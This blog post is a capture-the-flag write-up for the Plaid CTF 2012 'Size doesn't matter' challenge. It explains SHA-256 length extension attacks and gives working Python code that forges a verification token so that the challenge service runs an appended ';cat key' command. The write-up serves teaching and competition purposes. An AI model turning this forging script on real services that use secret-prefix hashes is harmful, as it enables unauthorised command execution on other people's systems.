---
layout: post
title: Plaid CTF 2012 - "Size doesn't matter"
tags: <++>
year: 2012
month: 04
day: 30
published: true
summary: Solution for the PCTF 2012 puzzle "Size doesn't matter"
---

What an awesome CTF. The "Size Doesn't Matter" challenge read:

> Size Doesn't Matter [250] Password Guessing
>
>We found a pair of robot command execution services running at 23.20.239.9 ports 8888 and
>8889. Can you break into it?

The first service, when poked, asked for a command and answered with the following:

> Your verification string is valid for your command for 10 seconds: 60a33bc5e3be71846a60b2103e46cce3045e8380e04f9cd69e29c1c575284930
>
>secret: XXXXXXXX
>
>timecode: 12:32:3
>
>command: ls

The second service requested something of the form (after an update of the challenge):

> Please send command1;command2;command3::verification

One shall be enough. :-)

After playing a bit with it and seeing that the command input was stripped and filtered to
only allow letters, we started fiddling with the token. Looks like SHA-256 in length, so
assuming it is, it could be subject to a length extension attack.

Length extension attacks are basically a property of Merkle–Damgård construction. Think of
it this way: a SHA-2 digest is essentially the internal function state after consuming the
message, its padding (if any) plus the length in bits. If you wanted, you could grab it,
initialize a SHA-2 implementation with it and the length of the processed message thus
far, and continue hashing additional blocks. The end result is the digest of:

    [ Initial message | 0x80 | Padding | Length | Concatenated message ]

Now as the commands were fed to bash by a Python script, concatenating a semicolon plus a
`cat key` will presumably get us where we want. The good folks at
[vnsecurity](http://www.vnsecurity.net) had already provided an implementation I modified.
So off we go,

```python
#!/usr/bin/env python
import sha256 # PyPy's sha256 module works.
import struct

class shaext:
    """
    Performs SHA-256 length extension.
    """
    def __init__(self, origtext, keylen, origsig):
        self.origtext = origtext
        self.keylen = keylen
        self.origsig = origsig
        self.addtext = ''
        self.init()

    def init(self):
        count = (self.keylen + len(self.origtext)) * 8
        index = (count &gt;&gt; 3) &amp; 0x3FL
        padLen = 120 - index
        if index &lt; 56:
            padLen = 56 - index
        padding = '\x80' + '\x00' * 63

        self.input = self.origtext + padding[:padLen] + struct.pack('&gt;Q', count)
        count = (self.keylen + len(self.input)) * 8
        self.impl = sha256.sha256()
        self.impl._sha['count_lo'] = count
        self.impl._sha['count_hi'] = 0

        _digest = self.origsig.decode("hex")
        self.impl._sha['digest'] = [x for x in struct.unpack("&gt;IIIIIIII", _digest)]

    def add(self, addtext):
        self.addtext = self.addtext + addtext
        self.impl.update(addtext)

    def final(self):
        new_sig = self.impl.hexdigest()
        new_msg = self.input + self.addtext
        return (new_msg, new_sig)
```

and then we fiddle with the two services, like so:

```python
import socket, time
import shaext

IP='...'
PORT1=8888
PORT2=8889
COMMAND=''

while True:
    sock_verifier = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_verifier.connect((IP,PORT1))
    COMMAND = raw_input('cmd? ')
    sock_verifier.send((COMMAND + '\x0a'))
    verification = sock_verifier.recv(256)
    sock_verifier.close()

    print(verification)
    token_begin = verification.find('seconds: ') + len('seconds: ')
    token_end   = verification.find('\x0a');
    token       = verification[token_begin : token_end]
    timecode    = verification[verification.find('timecode: ') + 10 : verification.find('timecode: ') + 17]

    extension = shaext.shaext(COMMAND, 8 + len(timecode), token)
    extension.add(';cat key')
    (new_msg, new_token) = extension.final()
    print('[+] New command: ' + new_msg)
    print('[+] New token  : ' + new_token)

    command_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_sock.connect((IP, PORT2))
    buf = new_msg + '::' + new_token + '\x0a'
    command_sock.send(buf)
    data_rcv2 = command_sock.recv(4096)
    print(data_rcv2)
    command_sock.close()
```

Which nets us the key:

> my_hash_is_longer_than_your_hash
